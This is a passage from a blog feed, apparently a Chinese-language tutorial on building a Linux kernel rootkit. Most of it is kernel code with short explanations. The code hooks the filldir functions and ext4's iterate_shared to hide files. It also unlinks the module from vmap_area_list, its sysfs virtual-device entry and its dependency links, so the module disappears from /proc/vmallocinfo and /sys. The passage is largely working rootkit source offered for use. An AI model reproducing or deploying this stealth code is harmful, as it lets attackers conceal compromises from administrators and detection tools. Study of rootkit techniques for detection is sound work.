class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hook_info</span> <span class="title">filldir_hook_info</span>, <span class="title">filldir64_hook_info</span>, <span class="title">compat_filldir_hook_info</span>;</span></span><br><span class="line"><span class="keyword">filldir_t</span> filldir, filldir64, compat_filldir;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hide_file_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *file_name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">hide_file_list</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">rootkit_evil_filldir64</span><span class="params">(<span class="keyword">size_t</span> arg0, <span class="keyword">size_t</span> arg1, <span class="keyword">size_t</span> arg2,</span></span></span><br><span class="line"><span class="params"><span class="function">                              <span class="keyword">size_t</span> arg3, <span class="keyword">size_t</span> arg4, <span class="keyword">size_t</span> arg5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hide_file_info</span> *<span class="title">info</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">6</span>], ret;</span><br><span class="line"></span><br><span class="line">    args[<span class="number">0</span>] = arg0;</span><br><span class="line">    args[<span class="number">1</span>] = arg1;</span><br><span class="line">    args[<span class="number">2</span>] = arg2;</span><br><span class="line">    args[<span class="number">3</span>] = arg3;</span><br><span class="line">    args[<span class="number">4</span>] = arg4;</span><br><span class="line">    args[<span class="number">5</span>] = arg5;</span><br><span class="line"></span><br><span class="line">    rootkit_write_read_only_mem_by_ioremap(filldir_hook_info.orig_func,</span><br><span class="line">                                           filldir_hook_info.orig_data,</span><br><span class="line">                                           HOOK_BUF_SZ);</span><br><span class="line"></span><br><span class="line">    list_for_each_entry(info, &amp;hide_file_list, <span class="built_in">list</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(info-&gt;file_name, args[<span class="number">1</span>], args[<span class="number">2</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            ret = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">goto</span> hide_out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = filldir_hook_info.orig_func(args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>],</span><br><span class="line">                                      args[<span class="number">3</span>], args[<span class="number">4</span>], args[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">hide_out:</span><br><span class="line">    rootkit_write_read_only_mem_by_ioremap(filldir_hook_info.orig_func,</span><br><span class="line">                                           filldir_hook_info.hook_data,</span><br><span class="line">                                           HOOK_BUF_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_hide_file_subsystem_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    INIT_LIST_HEAD(&amp;hide_file_list);</span><br><span class="line">    rootkit_text_hook(filldir, rootkit_evil_filldir,</span><br><span class="line">                      &amp;filldir_hook_info);</span><br><span class="line">    rootkit_text_hook(filldir64, rootkit_evil_filldir64,</span><br><span class="line">                      &amp;filldir64_hook_info);</span><br><span class="line">    rootkit_text_hook(compat_filldir, rootkit_evil_compat_filldir,</span><br><span class="line">                      &amp;compat_filldir_hook_info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_add_new_hide_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *file_name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hide_file_info</span> *<span class="title">info</span>;</span></span><br><span class="line"></span><br><span class="line">    info = kmalloc(<span class="keyword">sizeof</span>(*info), GFP_KERNEL);</span><br><span class="line">    info-&gt;file_name = kmalloc(<span class="built_in">strlen</span>(file_name) + <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line">    <span class="built_in">strcpy</span>(info-&gt;file_name, file_name);</span><br><span class="line"></span><br><span class="line">    list_add(&amp;info-&gt;<span class="built_in">list</span>, &amp;hide_file_list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="劫持对应文件系统的VFS函数表"><a href="#劫持对应文件系统的VFS函数表" class="headerlink" title="劫持对应文件系统的VFS函数表"></a>劫持对应文件系统的VFS函数表</h3><p>前面提到便利文件一定会调用到<code>iterate_dir</code>函数，而其又会调用函数表中的<code>iterate_shared</code>函数，所以这里通过劫持函数表中的<code>iterate_shared</code>函数为我们自己的函数，随后在修改ctx劫持<code>ctx-&gt;actor</code>为我们自己的函数即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hook_info</span> <span class="title">filldir_hook_info</span>,<span class="title">filldir64_hook_info</span>,<span class="title">compat_filldir_hook_info</span>;</span></span><br><span class="line"><span class="keyword">filldir_t</span> filldir, filldir64, compat_filldir;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">ext4_dir_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hide_file_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *file_name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">hide_file_list</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_fake_filldir</span><span class="params">(struct dir_context *ctx, <span class="keyword">const</span> <span class="keyword">char</span> *name,</span></span></span><br><span class="line"><span class="params"><span class="function">                                   <span class="keyword">int</span> namlen, <span class="keyword">loff_t</span> offset, u64 ino, </span></span></span><br><span class="line"><span class="params"><span class="function">                                   <span class="keyword">unsigned</span> <span class="keyword">int</span> d_type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (rootkit_check_file_to_hide(name, namlen)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> filldir(ctx, name, namlen, offset, ino, d_type);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_fake_filldir64</span><span class="params">(struct dir_context *ctx, <span class="keyword">const</span> <span class="keyword">char</span> *name,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     <span class="keyword">int</span> namlen, <span class="keyword">loff_t</span> offset, u64 ino, </span></span></span><br><span class="line"><span class="params"><span class="function">                                     <span class="keyword">unsigned</span> <span class="keyword">int</span> d_type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (rootkit_check_file_to_hide(name, namlen)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> filldir64(ctx, name, namlen, offset, ino, d_type);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_fake_compat_filldir</span><span class="params">(struct dir_context *ctx, <span class="keyword">const</span> <span class="keyword">char</span> *name,</span></span></span><br><span class="line"><span class="params"><span class="function">                                          <span class="keyword">int</span> namlen, <span class="keyword">loff_t</span> offset, u64 ino, </span></span></span><br><span class="line"><span class="params"><span class="function">                                          <span class="keyword">unsigned</span> <span class="keyword">int</span> d_type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (rootkit_check_file_to_hide(name, namlen)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> compat_filldir(ctx, name, namlen, offset, ino, d_type);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> (*orig_ext4_iterate_shared) (struct file *, struct dir_context *);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_fake_ext4_iterate_shared</span><span class="params">(struct file *file, </span></span></span><br><span class="line"><span class="params"><span class="function">                                               struct dir_context *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;actor == filldir) &#123;</span><br><span class="line">        ctx-&gt;actor = (<span class="keyword">void</span>*) rootkit_fake_filldir;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctx-&gt;actor == filldir64) &#123;</span><br><span class="line">        ctx-&gt;actor = (<span class="keyword">void</span>*) rootkit_fake_filldir64;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctx-&gt;actor == compat_filldir) &#123;</span><br><span class="line">        ctx-&gt;actor = (<span class="keyword">void</span>*) rootkit_fake_compat_filldir;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        panic(<span class="string">&quot;Unexpected ctx-&gt;actor!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> orig_ext4_iterate_shared(file, ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_vfs_hide_file_subsystem_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"></span><br><span class="line">    INIT_LIST_HEAD(&amp;hide_file_list);</span><br><span class="line"></span><br><span class="line">    rootkit_disable_write_protect();</span><br><span class="line"></span><br><span class="line">    file = filp_open(<span class="string">&quot;/&quot;</span>, O_RDONLY, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(file)) &#123;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ext4_dir_operations = file-&gt;f_op;</span><br><span class="line">    printk(KERN_ERR <span class="string">&quot;Got addr of ext4_dir_operations: %lx&quot;</span>,ext4_dir_operations);</span><br><span class="line">    orig_ext4_iterate_shared = ext4_dir_operations-&gt;iterate_shared;</span><br><span class="line">    ext4_dir_operations-&gt;iterate_shared = rootkit_fake_ext4_iterate_shared;</span><br><span class="line"></span><br><span class="line">    filp_close(file, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    rootkit_enable_write_protect();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_add_new_hide_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *file_name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hide_file_info</span> *<span class="title">info</span>;</span></span><br><span class="line"></span><br><span class="line">    info = kmalloc(<span class="keyword">sizeof</span>(*info), GFP_KERNEL);</span><br><span class="line">    info-&gt;file_name = kmalloc(<span class="built_in">strlen</span>(file_name) + <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line">    <span class="built_in">strcpy</span>(info-&gt;file_name, file_name);</span><br><span class="line"></span><br><span class="line">    list_add(&amp;info-&gt;<span class="built_in">list</span>, &amp;hide_file_list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="其余信息隐藏"><a href="#其余信息隐藏" class="headerlink" title="其余信息隐藏"></a>其余信息隐藏</h2><h3 id="proc-vmallocinfo隐藏"><a href="#proc-vmallocinfo隐藏" class="headerlink" title="&#x2F;proc&#x2F;vmallocinfo隐藏"></a>&#x2F;proc&#x2F;vmallocinfo隐藏</h3><p>内核模块的内存是通过 <code>vmap</code> 机制进行动态分配的，该机制用以分配一块虚拟地址连续的内存。主要原理是在对应的虚拟地址空间中找到足够大的一块空闲区域，之后建立虚拟地址到物理页面的映射，对于内核模块而言为 <code>ffffffffa0000000~fffffffffeffffff</code>。</p><p>在内核当中所有非连续映射的内核虚拟空间都有着一个对应的 <code>vmap_area</code> 结构体进行表示，其中 <code>vmap_area</code> 结构在内核当中同时以红黑树（负责根据虚拟地址进行快速索引）与链表进行组织</p><p><img   src="/images/image3a54cf56f42308fd.png" ></p><p>当我们读取<code>/proc/vmallocinfo</code>文件时我们可以所有通过<code>vmap</code>机制分配的内存信息，其中包含rootkit所存在的内存区域</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~ <span class="comment"># cat /proc/vmallocinfo | grep load_module</span></span><br><span class="line">0x(____ptrval____)-0x(____ptrval____)   20480 load_module+0x1959/0x2b90 pages=4 vmalloc N0=4</span><br><span class="line">~ <span class="comment"># </span></span><br></pre></td></tr></table></figure><p>通过检测系统中rootkit思路是可以通过这里泄漏出来的地址来实现找到rootkit的，因此还需要进行隐藏。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">proc_vmalloc_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (IS_ENABLED(CONFIG_NUMA))</span><br><span class="line">proc_create_seq_private(<span class="string">&quot;vmallocinfo&quot;</span>, <span class="number">0400</span>, <span class="literal">NULL</span>,</span><br><span class="line">&amp;vmalloc_op,</span><br><span class="line">nr_node_ids * <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">proc_create_seq(<span class="string">&quot;vmallocinfo&quot;</span>, <span class="number">0400</span>, <span class="literal">NULL</span>, &amp;vmalloc_op);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">module_init(proc_vmalloc_init);</span><br></pre></td></tr></table></figure><p><code>/proc/vmallocinfo</code>的实现类似于<code>/proc/module</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">s_next</span><span class="params">(struct seq_file *m, <span class="keyword">void</span> *p, <span class="keyword">loff_t</span> *pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> seq_list_next(p, &amp;vmap_area_list, pos);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是通过<code>vmap_area_list</code>遍历的，所以从这一全局链表中摘除即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/rbtree.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/vmalloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* You should get it from /proc/kallsyms */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span> *<span class="title">vmap_area_root</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *_<span class="title">vmap_area_list</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_hide_module_meminfo</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vmap_area</span> *<span class="title">va</span>, *<span class="title">tmp_va</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> mo_addr;</span><br><span class="line"></span><br><span class="line">    mo_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) THIS_MODULE;</span><br><span class="line"></span><br><span class="line">    list_for_each_entry_safe(va, tmp_va, _vmap_area_list, <span class="built_in">list</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mo_addr &gt; va-&gt;va_start &amp;&amp; mo_addr &lt; va-&gt;va_end) &#123;</span><br><span class="line">            list_del(&amp;va-&gt;<span class="built_in">list</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sys-device-virtual隐藏"><a href="#sys-device-virtual隐藏" class="headerlink" title="&#x2F;sys&#x2F;device&#x2F;virtual隐藏"></a>&#x2F;sys&#x2F;device&#x2F;virtual隐藏</h3><p>我们在创建rootkit的时候并没有指定父类设备，而所有没有父类的设备在<code>/sys/device/virtual/</code>目录下都会存在文件夹。</p><p>这里首先审视一下<code>device_create</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">device_create =&gt; device_create_groups_vargs =&gt; device_add =&gt; get_device_parent =&gt; virtual_device_parent &amp;&amp; class_dir_create_and_add</span><br></pre></td></tr></table></figure><p>在创建设备时会存上如上调用链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kobject *<span class="title">virtual_device_parent</span><span class="params">(struct device *dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> *<span class="title">virtual_dir</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!virtual_dir)</span><br><span class="line">virtual_dir = kobject_create_and_add(<span class="string">&quot;virtual&quot;</span>,</span><br><span class="line">     &amp;devices_kset-&gt;kobj);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> virtual_dir;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>virtual_device_parent</code>这一函数作用很容易看出来就是获取<code>virtual</code>文件夹。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct kobject *</span></span><br><span class="line"><span class="function"><span class="title">class_dir_create_and_add</span><span class="params">(struct class *class, struct kobject *parent_kobj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">class_dir</span> *<span class="title">dir</span>;</span></span><br><span class="line"><span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line">dir = kzalloc(<span class="keyword">sizeof</span>(*dir), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!dir)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">dir-&gt;<span class="class"><span class="keyword">class</span> =</span> <span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">kobject_init(&amp;dir-&gt;kobj, &amp;class_dir_ktype);</span><br><span class="line"></span><br><span class="line">dir-&gt;kobj.kset = &amp;class-&gt;p-&gt;glue_dirs;</span><br><span class="line"></span><br><span class="line">retval = kobject_add(&amp;dir-&gt;kobj, parent_kobj, <span class="string">&quot;%s&quot;</span>, class-&gt;name);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">kobject_put(&amp;dir-&gt;kobj);</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(retval);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;dir-&gt;kobj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 <code>class_dir_create_and_add</code> 会创建一个新的 <code>class_dir</code> ，添加到前面获得的 <code>/sys/devices/virtual</code> 对应的 kobject上。</p><p><code>get_device_parent</code> 会将新建的 <code>class_dir</code> 作为 kobject 返回给 <code>device_add()</code> ，之后其会被赋给 <code>dev-&gt;kobj.parent</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_hide_module_sys_device_virtual</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    kobject_del(module_device-&gt;kobj.parent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以这里只需进行如上操作即可隐藏。</p><h3 id="模块依赖关系隐藏"><a href="#模块依赖关系隐藏" class="headerlink" title="模块依赖关系隐藏"></a>模块依赖关系隐藏</h3><p>模块依赖关系会被记录到<code>sys/module/依赖模块/holder/</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* modules using other modules: kdb wants to see this. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module_use</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">source_list</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">target_list</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">source</span>, *<span class="title">target</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>依赖关系通过这一结构体来表示，本质依旧是链表构建的依赖关系。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_hide_module_dependency</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module_use</span> *<span class="title">use</span>, *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line">    list_for_each_entry_safe(use, tmp, &amp;THIS_MODULE-&gt;target_list, target_list) &#123;</span><br><span class="line">        list_del(&amp;use-&gt;source_list);</span><br><span class="line">        list_del(&amp;use-&gt;target_list);</span><br><span class="line">        sysfs_remove_link(use-&gt;target-&gt;holders_dir, THIS_MODULE-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此还是只需要进行脱链操作即可。</p><hr><p>参考链接：</p><p><a class="link"   href="https://xz.aliyun.com/t/12439" >https://xz.aliyun.com/t/12439<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;由于懒狗症发作加上每天沉迷游戏导致很久没有更新文章了，其实上一篇的Rootkit其实都是残缺版但是不想继续写了就直接加了个入门两个字就发出来</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    
    <category term="LKM" scheme="https://196082.github.io/tags/LKM/"/>
    
  </entry>
  
  <entry>
    <title>Linux Rootkit入门</title>
    <link href="https://196082.github.io/2024/02/16/Linux-Rootkit/"/>
    <id>https://196082.github.io/2024/02/16/Linux-Rootkit/</id>
    <published>2024-02-16T09:06:09.000Z</published>
    <updated>2024-02-16T09:05:35.000Z</updated>
    
